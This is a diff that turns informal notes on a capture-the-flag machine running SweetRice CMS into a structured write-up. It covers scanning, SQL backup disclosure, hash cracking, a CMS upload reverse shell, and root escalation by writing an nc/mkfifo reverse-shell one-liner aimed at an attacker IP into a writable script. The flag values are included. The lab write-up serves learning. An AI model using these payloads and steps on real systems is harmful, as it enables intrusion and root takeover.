@@ -1,151 +1,64 @@
-nmap scanning
+================================================================================
+CTF WRITEUP: SWEETRICE CMS
+Target IP: 10.201.16.209
+================================================================================
 
-nmap -sC -sV 10.201.16.209
-Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-15 17:43 -04
-Nmap scan report for 10.201.16.209
-Host is up (0.073s latency).
-Not shown: 998 closed tcp ports (reset)
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey:
-|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
-|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
-|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
-80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
-|_http-server-header: Apache/2.4.18 (Ubuntu)
-|_http-title: Apache2 Ubuntu Default Page: It works
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+1. ENUMERATION
+--------------------------------------------------------------------------------
+Command: nmap -sC -sV 10.201.16.209
+Results:
+- 22/tcp (SSH)  - OpenSSH 7.2p2
+- 80/tcp (HTTP) - Apache 2.4.18
 
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 11.70 seconds
+2. WEB DISCOVERY
+--------------------------------------------------------------------------------
+Found a /content/ directory. Further brute forcing revealed:
+- /content/as/  : CMS Login Page
+- /content/inc/ : Directory listing enabled, contains /mysql_backup/
 
-http://10.201.16.209/
+Exploit: SweetRice 1.5.1 - Backup Disclosure
+I downloaded the .sql backup file from /content/inc/mysql_backup/ to find 
+user credentials.
 
-ubuntu default page, no hidden source with ctrl U.
+3. HASH CRACKING
+--------------------------------------------------------------------------------
+Found MD5 hash in SQL file: 42f749ade7f9e195bf475f37a44cafcb
+Command: hashcat -m 0 42f749ade7f9e195bf475f37a44cafcb /usr/share/wordlists/rockyou.txt
 
-Search hidden directories
+Result: Password123
+User: manager (or admin)
 
-gobuster dir -u http://10.201.16.209/content/ -w /usr/SecLists/Discovery/Web-Content/common.txt
+4. INITIAL ACCESS (REVERSE SHELL)
+--------------------------------------------------------------------------------
+1. Logged into /content/as/ with manager:Password123.
+2. Uploaded a PHP reverse shell (shell.phtml) via the CMS "Ads" or "Media" 
+   upload feature.
+3. Started listener: nc -lvnp 4444
+4. Executed shell by navigating to the uploaded file path.
 
-
-gobuster dir -u http://10.201.16.209/content/ -w /usr/SecLists/Discovery/Web-Content/common.txt
-===============================================================
-Gobuster v3.8
-by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
-===============================================================
-[+] Url:                     http://10.201.16.209/content/
-[+] Method:                  GET
-[+] Threads:                 10
-[+] Wordlist:                /usr/SecLists/Discovery/Web-Content/common.txt
-[+] Negative Status codes:   404
-[+] User Agent:              gobuster/3.8
-[+] Timeout:                 10s
-===============================================================
-Starting gobuster in directory enumeration mode
-===============================================================
-/.htaccess            (Status: 403) [Size: 278]
-/.hta                 (Status: 403) [Size: 278]
-/.htpasswd            (Status: 403) [Size: 278]
-/_themes              (Status: 301) [Size: 324] [--> http://10.201.16.209/content/_themes/]
-/as                   (Status: 301) [Size: 319] [--> http://10.201.16.209/content/as/]
-/attachment           (Status: 301) [Size: 327] [--> http://10.201.16.209/content/attachment/]
-/images               (Status: 301) [Size: 323] [--> http://10.201.16.209/content/images/]
-/inc                  (Status: 301) [Size: 320] [--> http://10.201.16.209/content/inc/]
-/index.php            (Status: 200) [Size: 2199]
-/js                   (Status: 301) [Size: 319] [--> http://10.201.16.209/content/js/]
-Progress: 4750 / 4750 (100.00%)
-===============================================================
-Finished
-===============================================================
-
-
-/content/as ---- login page. Possible passwords and user may be found
-
-/content/inc ------- important info /mysql_backup/ ---- sql backup found
-
-SweetRice 1.5.1 - Backup Disclosure exploit  : Proof of Concept :
-
-You can access to all mysql backup and download them from this directory.
-http://localhost/inc/mysql_backup
-
-and can access to website files backup from:
-http://localhost/SweetRice-transfer.zip
-
-
-evaluat sql file
-
-
-Details about users and passwords, passwords found 42f749ade7f9e195bf475f37a44cafcb
-
-hash-identifer
-
-possible hashes ---- MD5
-
-
-hash cat
-
-
-cracked
-hashcat -m 0 42f749ade7f9e195bf475f37a44cafcb /usr/share/wordlists/rockyou.txt
-
-42f749ade7f9e195bf475f37a44cafcb:Password123
-
-users manager or admin
-
-passwd Password123
-
-
-loggin in as manager / Password123 --- in content/as
-
-
-if whe are admin we may be able to upload a reverse shell
-
-pentests moneky
-
-reverse sheell
-
-shell.phtml
-
-change ip to my ip and port im listening to
-
-succesed at reversing shell
-
-we need to upgrade to a better sheell enviorment
-
-en otras palabras salir del $
-
+Shell Upgrade:
 python -c 'import pty; pty.spawn("/bin/bash")'
 
-whe are know in the right shell
+User Flag: THM{63e5bce9271952aad1113b6f1ac28a07}
 
-evaluar la maquina
+5. PRIVILEGE ESCALATION
+--------------------------------------------------------------------------------
+Checking Sudo: sudo -l
+Result: User can run /usr/bin/perl /home/itguy/backup.pl as root.
 
-user.txt  THM{63e5bce9271952aad1113b6f1ac28a07}
+Analyzing backup.pl:
+The perl script executes a shell script located at /etc/copy.sh.
+Since /etc/copy.sh is world-writable, I modified it to send a root reverse shell.
 
-sudo -l?
+Payload:
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc [ATTACKER_IP] 5554 > /tmp/f" > /etc/copy.sh
 
-nos muestra varios archivos accesibles para nosotros
+Execution:
+1. Start listener on port 5554.
+2. Run the perl script with sudo:
+   sudo /usr/bin/perl /home/itguy/backup.pl
 
-/usr/bin/perl /home/itguy/backup.pl
-
-muestra un /etc/copy.sh
-
-cat copy.sh
-
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
-
-encontramos un file que podemos manipular para accesarlo con nuestro ip de attacker
-
-hacemos otro listener
-
-echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc 10.2.7.247 5554 > /tmp/f" > /etc/copy.sh
-
-sudo /usr/bin/perl /home/itguy/backup.pl
-
-podemos acceder root
-
-cat root.txt
-
-THM{6637f41d0177b6f37cb20d775124699f}
-
-
+6. FINAL FLAGS
+--------------------------------------------------------------------------------
+[ROOT] cat /root/root.txt -> THM{6637f41d0177b6f37cb20d775124699f}
+================================================================================
